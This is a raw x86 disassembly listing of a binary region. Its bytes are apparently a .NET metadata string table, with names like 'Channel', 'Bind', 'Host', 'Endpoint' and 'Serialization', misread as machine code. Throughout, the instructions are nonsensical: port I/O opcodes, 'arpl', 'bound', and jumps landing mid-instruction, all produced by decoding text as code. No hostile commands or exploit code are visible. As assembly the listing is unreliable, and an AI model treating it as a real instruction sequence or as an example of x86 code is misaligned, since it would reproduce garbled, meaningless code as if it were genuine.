  408502:	js     0x40856d
  408504:	je     0x40854b
  408506:	jbe    0x40856d
  408508:	outs   dx,BYTE PTR ds:[esi]
  408509:	je     0x40850b
  40850b:	addr16 gs je 0x40856e
  40850f:	push   esp
  408510:	jb     0x408573
  408512:	arpl   WORD PTR [ebp+0x45],sp
  408515:	outs   dx,BYTE PTR ds:[esi]
  408516:	popa   
  408517:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  40851b:	add    BYTE PTR [ebx+0x65],dh
  40851e:	je     0x40857f
  408520:	push   esp
  408521:	jb     0x408584
  408523:	arpl   WORD PTR [ebp+0x45],sp
  408526:	outs   dx,BYTE PTR ds:[esi]
  408527:	popa   
  408528:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  40852c:	add    BYTE PTR [edi+0x73],bl
  40852f:	jns    0x40859f
  408531:	arpl   WORD PTR [edi+0x62],cx
  408534:	push   0x65
  408536:	arpl   WORD PTR [eax+eax*1+0x4d],si
  40853a:	popa   
  40853b:	imul   ebp,DWORD PTR [esi+0x0],0x616c6544
  408542:	jns    0x408597
  408544:	push   0x6f647475
  408549:	ja     0x4085b9
  40854b:	add    BYTE PTR [ebx+0x6f],al
  40854e:	outs   dx,BYTE PTR ds:[esi]
  40854f:	imul   sp,WORD PTR [edi+0x75],0x6572
  408555:	push   esp
  408556:	push   0x64616572
  40855b:	push   eax
  40855c:	outs   dx,DWORD PTR ds:[esi]
  40855d:	outs   dx,DWORD PTR ds:[esi]
  40855e:	ins    BYTE PTR es:[edi],dx
  40855f:	add    BYTE PTR [ebp+0x72],dl
  408562:	imul   eax,DWORD PTR [eax],0x4e74654e
  408568:	popa   
  408569:	ins    DWORD PTR es:[edi],dx
  40856a:	gs fs push eax
  40856d:	imul   esi,DWORD PTR [eax+0x65],0x646e6942
  408574:	imul   ebp,DWORD PTR [esi+0x67],0x65724300
  40857b:	popa   
  40857c:	je     0x4085e3
  40857e:	inc    ebx
  40857f:	outs   dx,DWORD PTR ds:[esi]
  408580:	ins    DWORD PTR es:[edi],dx
  408581:	ins    DWORD PTR es:[edi],dx
  408582:	popa   
  408583:	outs   dx,BYTE PTR ds:[esi]
  408584:	fs push ebx
  408586:	gs jb  0x4085ff
  408589:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  408590:	add    BYTE PTR [esi],ch
  408592:	arpl   WORD PTR [edi+ebp*2+0x72],si
  408596:	add    BYTE PTR [esp+edx*2],bh
  408599:	jb     0x4085fc
  40859b:	arpl   WORD PTR [ebp+0x45],sp
  40859e:	outs   dx,BYTE PTR ds:[esi]
  40859f:	popa   
  4085a0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4085a4:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  4085a9:	popa   
  4085aa:	arpl   WORD PTR [ebx+0x69],bp
  4085ad:	outs   dx,BYTE PTR ds:[esi]
  4085ae:	addr16 inc esi
  4085b0:	imul   esp,DWORD PTR [ebp+0x6c],0x72540064
  4085b7:	popa   
  4085b8:	arpl   WORD PTR [ebp+0x45],sp
  4085bb:	outs   dx,BYTE PTR ds:[esi]
  4085bc:	popa   
  4085bd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4085c1:	add    BYTE PTR [ebp+0x76],al
  4085c4:	outs   dx,BYTE PTR gs:[esi]
  4085c6:	je     0x40861f
  4085c8:	popa   
  4085c9:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  4085d1:	add    BYTE PTR [ecx+0x6e],cl
  4085d4:	jae    0x40864a
  4085d6:	popa   
  4085d7:	outs   dx,BYTE PTR ds:[esi]
  4085d8:	arpl   WORD PTR [ebp+0x43],sp
  4085db:	outs   dx,DWORD PTR ds:[esi]
  4085dc:	outs   dx,BYTE PTR ds:[esi]
  4085dd:	je     0x408644
  4085df:	js     0x408655
  4085e1:	add    BYTE PTR [ebx+0x79],dl
  4085e4:	jae    0x40865a
  4085e6:	gs ins DWORD PTR es:[edi],dx
  4085e8:	cs push ebx
  4085ea:	gs jb  0x408663
  4085ed:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4085f4:	ins    BYTE PTR es:[edi],dx
  4085f5:	cs inc ebx
  4085f7:	push   0x656e6e61
  4085fc:	ins    BYTE PTR es:[edi],dx
  4085fd:	jae    0x4085ff
  4085ff:	dec    ebp
  408600:	gs jae 0x408676
  408603:	popa   
  408604:	add    BYTE PTR gs:[bx+0x65],al
  408609:	je     0x408654
  40860b:	outs   dx,BYTE PTR ds:[esi]
  40860c:	jae    0x408682
  40860e:	popa   
  40860f:	outs   dx,BYTE PTR ds:[esi]
  408610:	arpl   WORD PTR [ebp+0x0],sp
  408613:	push   edx
  408614:	gs ins BYTE PTR es:[edi],dx
  408616:	gs popa 
  408618:	jae    0x40867f
  40861a:	dec    ecx
  40861b:	outs   dx,BYTE PTR ds:[esi]
  40861c:	jae    0x408692
  40861e:	popa   
  40861f:	outs   dx,BYTE PTR ds:[esi]
  408620:	arpl   WORD PTR [ebp+0x0],sp
  408623:	push   ebx
  408624:	gs jb  0x40869d
  408627:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  40862e:	outs   dx,DWORD PTR ds:[esi]
  40862f:	imul   ebp,DWORD PTR [esi+0x74],0x6e694200
  408636:	imul   ebp,DWORD PTR fs:[esi+0x67],0x61726150
  40863e:	ins    DWORD PTR es:[edi],dx
  40863f:	gs je  0x4086a7
  408642:	jb     0x408687
  408644:	outs   dx,DWORD PTR ds:[esi]
  408645:	ins    BYTE PTR es:[edi],dx
  408646:	ins    BYTE PTR es:[edi],dx
  408647:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40864c:	outs   dx,BYTE PTR ds:[esi]
  40864d:	add    BYTE PTR [ecx+0x64],al
  408650:	fs inc edx
  408652:	imul   ebp,DWORD PTR [esi+0x64],0x50676e69
  408659:	popa   
  40865a:	jb     0x4086bd
  40865c:	ins    DWORD PTR es:[edi],dx
  40865d:	gs je  0x4086c5
  408660:	jb     0x4086d5
  408662:	add    BYTE PTR [ebx+0x6c],al
  408665:	imul   esp,DWORD PTR [ebp+0x6e],0x6e755274
  40866c:	je     0x4086d7
  40866e:	ins    DWORD PTR es:[edi],dx
  40866f:	add    BYTE PTR gs:[ecx+0x70],al
  408673:	jo     0x4086e1
  408675:	jns    0x4086ba
  408677:	ins    BYTE PTR es:[edi],dx
  408678:	imul   esp,DWORD PTR [ebp+0x6e],0x68654274
  40867f:	popa   
  408680:	jbe    0x4086eb
  408682:	outs   dx,DWORD PTR ds:[esi]
  408683:	jb     0x408685
  408685:	inc    ebp
  408686:	outs   dx,BYTE PTR ds:[esi]
  408687:	fs jo  0x4086f9
  40868a:	imul   ebp,DWORD PTR [esi+0x74],0x70736944
  408691:	popa   
  408692:	je     0x4086f7
  408694:	push   0x41007265
  408699:	jo     0x40870b
  40869b:	ins    BYTE PTR es:[edi],dx
  40869c:	jns    0x4086e2
  40869e:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  4086a5:	inc    edx
  4086a6:	gs push 0x6f697661
  4086ac:	jb     0x4086ae
  4086ae:	push   esi
  4086af:	popa   
  4086b0:	ins    BYTE PTR es:[edi],dx
  4086b1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x75430065
  4086b9:	jb     0x40872d
  4086bb:	outs   dx,BYTE PTR gs:[esi]
  4086bd:	je     0x408702
  4086bf:	jne    0x40872d
  4086c1:	je     0x408738
  4086c3:	jb     0x40872a
  4086c5:	dec    eax
  4086c6:	gs popa 
  4086c8:	fs gs jb 0x4086cc
  4086cc:	inc    ebx
  4086cd:	jne    0x408741
  4086cf:	jb     0x408736
  4086d1:	outs   dx,BYTE PTR ds:[esi]
  4086d2:	je     0x408729
  4086d4:	dec    ecx
  4086d5:	inc    ebx
  4086d6:	jne    0x408744
  4086d8:	je     0x40874f
  4086da:	jb     0x408741
  4086dc:	dec    eax
  4086dd:	gs popa 
  4086df:	fs gs jb 0x4086e3
  4086e3:	dec    esp
  4086e4:	outs   dx,DWORD PTR ds:[esi]
  4086e5:	arpl   WORD PTR [ecx+0x6c],sp
  4086e8:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4086ef:	dec    esi
  4086f0:	popa   
  4086f1:	ins    DWORD PTR es:[edi],dx
  4086f2:	gs jae 0x408765
  4086f5:	popa   
  4086f6:	arpl   WORD PTR [ebp+0x0],sp
  4086f9:	dec    ecx
  4086fa:	inc    ebx
  4086fb:	ins    BYTE PTR es:[edi],dx
  4086fc:	imul   esp,DWORD PTR [ebp+0x6e],0x61684374
  408703:	outs   dx,BYTE PTR ds:[esi]
  408704:	outs   dx,BYTE PTR ds:[esi]
  408705:	gs ins BYTE PTR es:[edi],dx
  408707:	add    BYTE PTR [ecx+0x66],al
  40870a:	je     0x408771
  40870c:	jb     0x408760
  40870e:	arpl   WORD PTR gs:[ebp+0x69],sp
  408712:	jbe    0x408779
  408714:	push   edx
  408715:	gs jno 0x40878d
  408718:	gs jae 0x40878f
  40871b:	add    BYTE PTR [edx+0x65],al
  40871e:	outs   dx,WORD PTR ds:[esi]
  408720:	jb     0x408787
  408722:	push   ebx
  408723:	outs   dx,BYTE PTR gs:[esi]
  408725:	fs push edx
  408727:	gs jo  0x408796
  40872a:	jns    0x40872c
  40872c:	push   ebx
  40872d:	jns    0x4087a2
  40872f:	je     0x408796
  408731:	ins    DWORD PTR es:[edi],dx
  408732:	cs push ebx
  408734:	arpl   WORD PTR gs:[ebp+0x72],si
  408738:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  408740:	arpl   WORD PTR [ecx+0x70],bp
  408743:	popa   
  408744:	ins    BYTE PTR es:[edi],dx
  408745:	add    BYTE PTR [ebx+0x65],dl
  408748:	arpl   WORD PTR [ebp+0x72],si
  40874b:	imul   esi,DWORD PTR [ecx+edi*2+0x49],0x746e6564
  408753:	imul   esp,DWORD PTR [esi+0x69],0x5f007265
  40875a:	jae    0x4087c5
  40875c:	add    BYTE PTR fs:[edi+0x75],al
  408760:	imul   esp,DWORD PTR [eax+eax*1+0x5f],0x65696c63
  408768:	outs   dx,BYTE PTR ds:[esi]
  408769:	je     0x4087b4
  40876b:	add    BYTE PTR fs:[edi+0x70],cl
  40876f:	gs jb  0x4087d3
  408772:	je     0x4087dd
  408774:	outs   dx,DWORD PTR ds:[esi]
  408775:	outs   dx,BYTE PTR ds:[esi]
  408776:	inc    ebx
  408777:	outs   dx,DWORD PTR ds:[esi]
  408778:	outs   dx,BYTE PTR ds:[esi]
  408779:	je     0x4087e0
  40877b:	js     0x4087f1
  40877d:	add    BYTE PTR [ebx+0x68],al
  408780:	arpl   WORD PTR gs:[ebx+0x41],bp
  408784:	arpl   WORD PTR [ebx+0x65],sp
  408787:	jae    0x4087fc
  408789:	inc    ebx
  40878a:	outs   dx,DWORD PTR ds:[esi]
  40878b:	jb     0x4087f2
  40878d:	add    BYTE PTR [edi+0x63],bl
  408790:	bound  ebp,QWORD PTR [ebp+0x53]
  408793:	gs jb  0x40880c
  408796:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  40879d:	bound  esp,QWORD PTR [ecx+0x63]
  4087a0:	imul   eax,DWORD PTR [eax],0x53
  4087a3:	jns    0x408818
  4087a5:	je     0x40880c
  4087a7:	ins    DWORD PTR es:[edi],dx
  4087a8:	cs inc ebx
  4087aa:	outs   dx,DWORD PTR ds:[esi]
  4087ab:	fs gs inc esp
  4087ae:	outs   dx,DWORD PTR ds:[esi]
  4087af:	ins    DWORD PTR es:[edi],dx
  4087b0:	cs inc ebx
  4087b2:	outs   dx,DWORD PTR ds:[esi]
  4087b3:	ins    DWORD PTR es:[edi],dx
  4087b4:	jo     0x40881f
  4087b6:	ins    BYTE PTR es:[edi],dx
  4087b7:	gs jb  0x4087ba
  4087ba:	inc    ebx
  4087bb:	outs   dx,DWORD PTR ds:[esi]
  4087bc:	ins    DWORD PTR es:[edi],dx
  4087bd:	jo     0x408828
  4087bf:	ins    BYTE PTR es:[edi],dx
  4087c0:	gs jb  0x408808
  4087c3:	jb     0x408837
  4087c5:	outs   dx,DWORD PTR ds:[esi]
  4087c6:	jb     0x4087c8
  4087c8:	push   edx
  4087c9:	gs jo  0x40883b
  4087cc:	jb     0x408842
  4087ce:	inc    ebx
  4087cf:	outs   dx,DWORD PTR ds:[esi]
  4087d0:	ins    DWORD PTR es:[edi],dx
  4087d1:	jo     0x40883c
  4087d3:	ins    BYTE PTR es:[edi],dx
  4087d4:	gs jb  0x40881c
  4087d7:	jb     0x40884b
  4087d9:	outs   dx,DWORD PTR ds:[esi]
  4087da:	jb     0x4087dc
  4087dc:	push   eax
  4087dd:	popa   
  4087de:	jb     0x408853
  4087e0:	gs jb  0x408828
  4087e3:	jb     0x408857
  4087e5:	outs   dx,DWORD PTR ds:[esi]
  4087e6:	jb     0x4087e8
  4087e8:	push   edx
  4087e9:	gs jo  0x40885b
  4087ec:	jb     0x408862
  4087ee:	push   eax
  4087ef:	popa   
  4087f0:	jb     0x408865
  4087f2:	gs inc ebp
  4087f4:	jb     0x408868
  4087f6:	outs   dx,DWORD PTR ds:[esi]
  4087f7:	jb     0x4087f9
  4087f9:	push   edx
  4087fa:	gs jo  0x40886c
  4087fd:	jb     0x408873
  4087ff:	push   eax
  408800:	jb     0x408871
  408802:	addr16 jb 0x40886a
  408805:	jae    0x40887a
  408807:	add    BYTE PTR [edx+0x65],dl
  40880a:	jo     0x40887b
  40880c:	jb     0x408882
  40880e:	push   eax
  40880f:	popa   
  408810:	jb     0x408885
  408812:	gs jb  0x40885a
  408815:	js     0x40887a
  408817:	gs jo  0x40888e
  40881a:	imul   ebp,DWORD PTR [edi+0x6e],0x6f727245
  408821:	jb     0x408823
  408823:	push   ebx
  408824:	jns    0x408899
  408826:	je     0x40888d
  408828:	ins    DWORD PTR es:[edi],dx
  408829:	cs inc ebx
  40882b:	outs   dx,DWORD PTR ds:[esi]
  40882c:	outs   dx,BYTE PTR ds:[esi]
  40882d:	imul   sp,WORD PTR [edi+0x75],0x6172
  408833:	je     0x40889e
  408835:	outs   dx,DWORD PTR ds:[esi]
  408836:	outs   dx,BYTE PTR ds:[esi]
  408837:	add    BYTE PTR [ebx+0x6f],al
  40883a:	outs   dx,BYTE PTR ds:[esi]
  40883b:	imul   sp,WORD PTR [edi+0x75],0x6172
  408841:	je     0x4088ac
  408843:	outs   dx,DWORD PTR ds:[esi]
  408844:	outs   dx,BYTE PTR ds:[esi]
  408845:	inc    ebp
  408846:	js     0x4088ab
  408848:	gs jo  0x4088bf
  40884b:	imul   ebp,DWORD PTR [edi+0x6e],0x70655200
  408852:	outs   dx,DWORD PTR ds:[esi]
  408853:	jb     0x4088c9
  408855:	inc    ebx
  408856:	outs   dx,DWORD PTR ds:[esi]
  408857:	outs   dx,BYTE PTR ds:[esi]
  408858:	imul   sp,WORD PTR [edi+0x45],0x6378
  40885e:	gs jo  0x4088d5
  408861:	imul   ebp,DWORD PTR [edi+0x6e],0x6f727245
  408868:	jb     0x40886a
  40886a:	push   edx
  40886b:	gs jo  0x4088dd
  40886e:	jb     0x4088e4
  408870:	dec    edi
  408871:	je     0x4088db
  408873:	gs jb  0x4088bb
  408876:	jb     0x4088ea
  408878:	outs   dx,DWORD PTR ds:[esi]
  408879:	jb     0x40887b
  40887b:	pop    edi
  40887c:	popa   
  40887d:	jae    0x4088f2
  40887f:	gs ins DWORD PTR es:[edi],dx
  408881:	bound  ebp,QWORD PTR [ecx+edi*2+0x45]
  408885:	js     0x4088fb
  408887:	outs   dx,BYTE PTR gs:[esi]
  408889:	jae    0x4088f4
  40888b:	outs   dx,DWORD PTR ds:[esi]
  40888c:	outs   dx,BYTE PTR ds:[esi]
  40888d:	push   eax
  40888e:	popa   
  40888f:	je     0x408905
  408891:	gs jb  0x408902
  408894:	add    BYTE PTR [edi+0x61],bl
  408897:	jae    0x40890c
  408899:	gs ins DWORD PTR es:[edi],dx
  40889b:	bound  ebp,QWORD PTR [ecx+edi*2+0x45]
  40889f:	js     0x408915
  4088a1:	outs   dx,BYTE PTR gs:[esi]
  4088a3:	jae    0x40890e
  4088a5:	outs   dx,DWORD PTR ds:[esi]
  4088a6:	outs   dx,BYTE PTR ds:[esi]
  4088a7:	add    BYTE PTR [edi+0x72],bl
  4088aa:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  4088b3:	inc    esi
  4088b4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6465725f
  4088bc:	imul   esi,DWORD PTR [ebx+0x74],0x7473694c
  4088c3:	inc    esi
  4088c4:	outs   dx,DWORD PTR ds:[esi]
  4088c5:	ins    BYTE PTR es:[edi],dx
  4088c6:	fs gs jb 0x4088ca
  4088ca:	pop    edi
  4088cb:	outs   dx,DWORD PTR fs:[esi]
  4088cd:	je     0x40891d
  4088cf:	gs je  0x408918
  4088d2:	js     0x408908
  4088d4:	xor    BYTE PTR [eax+0x61],dl
  4088d7:	je     0x408941
  4088d9:	add    BYTE PTR [edi+0x64],bl
  4088dc:	outs   dx,DWORD PTR ds:[esi]
  4088dd:	je     0x40892d
  4088df:	gs je  0x408928
  4088e2:	js     0x408917
  4088e4:	xor    eax,0x68746150
  4088e9:	add    BYTE PTR [edi+0x64],bl
  4088ec:	outs   dx,DWORD PTR ds:[esi]
  4088ed:	je     0x40893d
  4088ef:	gs je  0x408938
  4088f2:	js     0x408927
  4088f4:	xor    BYTE PTR [eax+0x61],dl
  4088f7:	je     0x408961
  4088f9:	add    BYTE PTR [edi+0x64],bl
  4088fc:	outs   dx,DWORD PTR ds:[esi]
  4088fd:	je     0x40894d
  4088ff:	gs je  0x408948
  408902:	js     0x408936
  408904:	xor    BYTE PTR [eax+0x61],dl
  408907:	je     0x408971
  408909:	add    BYTE PTR [ebx+0x79],dl
  40890c:	jae    0x408982
  40890e:	gs ins DWORD PTR es:[edi],dx
  408910:	cs inc ebx
  408912:	outs   dx,DWORD PTR ds:[esi]
  408913:	ins    BYTE PTR es:[edi],dx
  408914:	ins    BYTE PTR es:[edi],dx
  408915:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40891a:	outs   dx,BYTE PTR ds:[esi]
  40891b:	jae    0x40894b
  40891d:	inc    edi
  40891e:	outs   dx,BYTE PTR gs:[esi]
  408920:	gs jb  0x40898c
  408923:	arpl   WORD PTR [eax],ax
  408925:	dec    ecx
  408926:	dec    esp
  408927:	imul   esi,DWORD PTR [ebx+0x74],0x53003160
  40892e:	jns    0x4089a3
  408930:	je     0x408997
  408932:	ins    DWORD PTR es:[edi],dx
  408933:	cs push edx
  408935:	jne    0x4089a5
  408937:	je     0x4089a2
  408939:	ins    DWORD PTR es:[edi],dx
  40893a:	gs cs push esi
  40893d:	gs jb  0x4089b3
  408940:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  408947:	inc    esi
  408948:	jb     0x4089ab
  40894a:	ins    DWORD PTR es:[edi],dx
  40894b:	gs ja  0x4089bd
  40894e:	jb     0x4089bb
  408950:	dec    esi
  408951:	popa   
  408952:	ins    DWORD PTR es:[edi],dx
  408953:	add    BYTE PTR gs:[edi+0x65],al
  408957:	je     0x40899f
  408959:	jb     0x4089bc
  40895b:	ins    DWORD PTR es:[edi],dx
  40895c:	gs ja  0x4089ce
  40895f:	jb     0x4089cc
  408961:	inc    ecx
  408962:	jae    0x4089d7
  408964:	gs ins DWORD PTR es:[edi],dx
  408966:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  40896a:	jae    0x40896c
  40896c:	inc    esp
  40896d:	outs   dx,DWORD PTR ds:[esi]
  40896e:	gs jae 0x4089bd
  408971:	gs addr16 popa 
  408974:	arpl   WORD PTR [ecx+0x44],di
  408977:	outs   dx,BYTE PTR ds:[esi]
  408978:	inc    esi
  408979:	js     0x4089cb
  40897b:	popa   
  40897c:	je     0x4089e6
  40897e:	jae    0x4089c5
  408980:	js     0x4089eb
  408982:	jae    0x4089f8
  408984:	dec    ecx
  408985:	outs   dx,BYTE PTR ds:[esi]
  408986:	push   edx
  408987:	gs data16 gs jb 0x4089f1
  40898c:	outs   dx,BYTE PTR ds:[esi]
  40898d:	arpl   WORD PTR [ebp+0x43],sp
  408990:	push   0x6e6961
  408995:	dec    ecx
  408996:	outs   dx,BYTE PTR ds:[esi]
  408997:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40899f:	inc    esi
  4089a0:	jb     0x408a03
  4089a2:	ins    DWORD PTR es:[edi],dx
  4089a3:	gs ja  0x408a15
  4089a6:	jb     0x408a13
  4089a8:	push   eax
  4089a9:	popa   
  4089aa:	je     0x408a14
  4089ac:	jae    0x4089ae
  4089ae:	inc    edi
  4089af:	gs je  0x4089fe
  4089b2:	gs addr16 popa 
  4089b5:	arpl   WORD PTR [ecx+0x46],di
  4089b8:	jb     0x408a1b
  4089ba:	ins    DWORD PTR es:[edi],dx
  4089bb:	gs ja  0x408a2d
  4089be:	jb     0x408a2b
  4089c0:	inc    ecx
  4089c1:	jae    0x408a36
  4089c3:	gs ins DWORD PTR es:[edi],dx
  4089c5:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  4089c9:	jae    0x4089cb
  4089cb:	dec    ecx
  4089cc:	inc    esp
  4089cd:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  4089d4:	jb     0x408a4f
  4089d6:	pusha  
  4089d7:	xor    al,BYTE PTR [eax]
  4089d9:	inc    edi
  4089da:	gs je  0x408a23
  4089dd:	jb     0x408a40
  4089df:	ins    DWORD PTR es:[edi],dx
  4089e0:	gs ja  0x408a52
  4089e3:	jb     0x408a50
  4089e5:	inc    ecx
  4089e6:	jae    0x408a5b
  4089e8:	gs ins DWORD PTR es:[edi],dx
  4089ea:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  4089ee:	jae    0x408a36
  4089f0:	jb     0x408a61
  4089f2:	ins    DWORD PTR es:[edi],dx
  4089f3:	push   edx
  4089f4:	gs data16 gs jb 0x408a5e
  4089f9:	outs   dx,BYTE PTR ds:[esi]
  4089fa:	arpl   WORD PTR [ebp+0x50],sp
  4089fd:	popa   
  4089fe:	je     0x408a68
  408a00:	add    BYTE PTR [edi+0x65],al
  408a03:	je     0x408a4b
  408a05:	jb     0x408a68
  408a07:	ins    DWORD PTR es:[edi],dx
  408a08:	gs ja  0x408a7a
  408a0b:	jb     0x408a78
  408a0d:	inc    ecx
  408a0e:	jae    0x408a83
  408a10:	gs ins DWORD PTR es:[edi],dx
  408a12:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408a16:	jae    0x408a5e
  408a18:	jb     0x408a89
  408a1a:	ins    DWORD PTR es:[edi],dx
  408a1b:	push   edx
  408a1c:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  408a25:	add    BYTE PTR [edi+0x65],al
  408a28:	je     0x408a7c
  408a2a:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  408a33:	inc    esi
  408a34:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x687461
  408a3c:	push   esp
  408a3d:	imul   ebp,DWORD PTR [ebp+0x65],0x6e617053
  408a44:	add    BYTE PTR [ecx+0x4c],cl
  408a47:	gs popa 
  408a49:	jae    0x408ab0
  408a4b:	add    BYTE PTR [edx+0x65],dl
  408a4e:	outs   dx,BYTE PTR ds:[esi]
  408a4f:	gs ja  0x408ab3
  408a52:	ins    BYTE PTR es:[edi],dx
  408a53:	add    BYTE PTR [edi+0x74],bl
  408a56:	popa   
  408a57:	jb     0x408ac0
  408a59:	gs je  0x408aa2
  408a5c:	jb     0x408abf
  408a5e:	ins    DWORD PTR es:[edi],dx
  408a5f:	gs ja  0x408ad1
  408a62:	jb     0x408acf
  408a64:	add    BYTE PTR [ecx+ebp*2+0x63],al
  408a68:	je     0x408ad3
  408a6a:	outs   dx,DWORD PTR ds:[esi]
  408a6b:	outs   dx,BYTE PTR ds:[esi]
  408a6c:	popa   
  408a6d:	jb     0x408ae8
  408a6f:	pusha  
  408a70:	xor    al,BYTE PTR [eax]
  408a72:	pop    edi
  408a73:	bound  ebp,QWORD PTR [ecx+0x6e]
  408a76:	inc    ecx
  408a77:	jae    0x408aec
  408a79:	gs ins DWORD PTR es:[edi],dx
  408a7b:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408a7f:	jae    0x408a81
  408a81:	pop    edi
  408a82:	outs   dx,DWORD PTR ds:[esi]
  408a83:	je     0x408aed
  408a85:	gs jb  0x408ac9
  408a88:	jae    0x408afd
  408a8a:	gs ins DWORD PTR es:[edi],dx
  408a8c:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408a90:	jae    0x408a92
  408a92:	pop    edi
  408a93:	bound  ebp,QWORD PTR [ecx+0x6e]
  408a96:	inc    esi
  408a97:	outs   dx,DWORD PTR ds:[esi]
  408a98:	ins    BYTE PTR es:[edi],dx
  408a99:	fs gs jb 0x408aed
  408a9d:	popa   
  408a9e:	je     0x408b08
  408aa0:	add    BYTE PTR [edi+0x63],bl
  408aa3:	outs   dx,DWORD PTR ds:[esi]
  408aa4:	fs gs inc edi
  408aa7:	outs   dx,BYTE PTR gs:[esi]
  408aa9:	inc    esp
  408aaa:	imul   esi,DWORD PTR [edx+0x0],0x6e69625f
  408ab1:	push   ebx
  408ab2:	push   0x776f6461
  408ab7:	inc    esi
  408ab8:	outs   dx,DWORD PTR ds:[esi]
  408ab9:	ins    BYTE PTR es:[edi],dx
  408aba:	fs gs jb 0x408abe
  408abe:	pop    edi
  408abf:	data16 jb 0x408b23
  408ac2:	ins    DWORD PTR es:[edi],dx
  408ac3:	gs ja  0x408b35
  408ac6:	jb     0x408b33
  408ac8:	inc    ecx
  408ac9:	jae    0x408b3e
  408acb:	gs ins DWORD PTR es:[edi],dx
  408acd:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408ad1:	jae    0x408ad3
  408ad3:	addr16 gs je 0x408b36
  408ad7:	push   esp
  408ad8:	popa   
  408ad9:	jb     0x408b42
  408adb:	gs je  0x408b24
  408ade:	jb     0x408b41
  408ae0:	ins    DWORD PTR es:[edi],dx
  408ae1:	gs ja  0x408b53
  408ae4:	jb     0x408b51
  408ae6:	add    BYTE PTR [edi+0x65],ah
  408ae9:	je     0x408b4a
  408aeb:	inc    edx
  408aec:	imul   ebp,DWORD PTR [esi+0x46],0x65646c6f
  408af3:	jb     0x408b45
  408af5:	popa   
  408af6:	je     0x408b60
  408af8:	add    BYTE PTR [ebx+0x65],dh
  408afb:	je     0x408b5c
  408afd:	inc    edx
  408afe:	imul   ebp,DWORD PTR [esi+0x46],0x65646c6f
  408b05:	jb     0x408b57
  408b07:	popa   
  408b08:	je     0x408b72
  408b0a:	add    BYTE PTR [edi+0x65],ah
  408b0d:	je     0x408b6e
  408b0f:	inc    ebx
  408b10:	outs   dx,DWORD PTR ds:[esi]
  408b11:	fs gs inc edi
  408b14:	outs   dx,BYTE PTR gs:[esi]
  408b16:	inc    esp
  408b17:	imul   esi,DWORD PTR [edx+0x0],0x5f746573
  408b1e:	inc    ebx
  408b1f:	outs   dx,DWORD PTR ds:[esi]
  408b20:	fs gs inc edi
  408b23:	outs   dx,BYTE PTR gs:[esi]
  408b25:	inc    esp
  408b26:	imul   esi,DWORD PTR [edx+0x0],0x5f746567
  408b2d:	inc    edx
  408b2e:	imul   ebp,DWORD PTR [esi+0x41],0x6d657373
  408b35:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408b39:	jae    0x408b3b
  408b3b:	addr16 gs je 0x408b9e
  408b3f:	dec    edi
  408b40:	je     0x408baa
  408b42:	gs jb  0x408b86
  408b45:	jae    0x408bba
  408b47:	gs ins DWORD PTR es:[edi],dx
  408b49:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408b4d:	jae    0x408b4f
  408b4f:	addr16 gs je 0x408bb2
  408b53:	dec    eax
  408b54:	popa   
  408b55:	jbe    0x408bbc
  408b57:	push   ebp
  408b58:	jo     0x408bbe
  408b5a:	popa   
  408b5b:	je     0x408bc2
  408b5d:	fs push edx
  408b5f:	gs data16 gs jb 0x408bc9
  408b64:	outs   dx,BYTE PTR ds:[esi]
  408b65:	arpl   WORD PTR [ebp+0x73],sp
  408b68:	add    BYTE PTR [ebx+0x65],dh
  408b6b:	je     0x408bcc
  408b6d:	dec    eax
  408b6e:	popa   
  408b6f:	jbe    0x408bd6
  408b71:	push   ebp
  408b72:	jo     0x408bd8
  408b74:	popa   
  408b75:	je     0x408bdc
  408b77:	fs push edx
  408b79:	gs data16 gs jb 0x408be3
  408b7e:	outs   dx,BYTE PTR ds:[esi]
  408b7f:	arpl   WORD PTR [ebp+0x73],sp
  408b82:	add    BYTE PTR [ecx+0x6e],cl
  408b85:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  408b8d:	add    BYTE PTR [ecx+edi*2+0x70],dl
  408b91:	add    BYTE PTR gs:[edi+0x65],al
  408b95:	je     0x408bea
  408b97:	gs jb  0x408c10
  408b9a:	imul   esp,DWORD PTR [ebx+0x65],0x73795300
  408ba1:	je     0x408c08
  408ba3:	ins    DWORD PTR es:[edi],dx
  408ba4:	cs push edx
  408ba6:	gs data16 ins BYTE PTR es:[edi],dx
  408ba9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408bae:	outs   dx,BYTE PTR ds:[esi]
  408baf:	add    BYTE PTR [ecx+0x73],al
  408bb2:	jae    0x408c19
  408bb4:	ins    DWORD PTR es:[edi],dx
  408bb5:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  408bb9:	popa   
  408bba:	ins    DWORD PTR es:[edi],dx
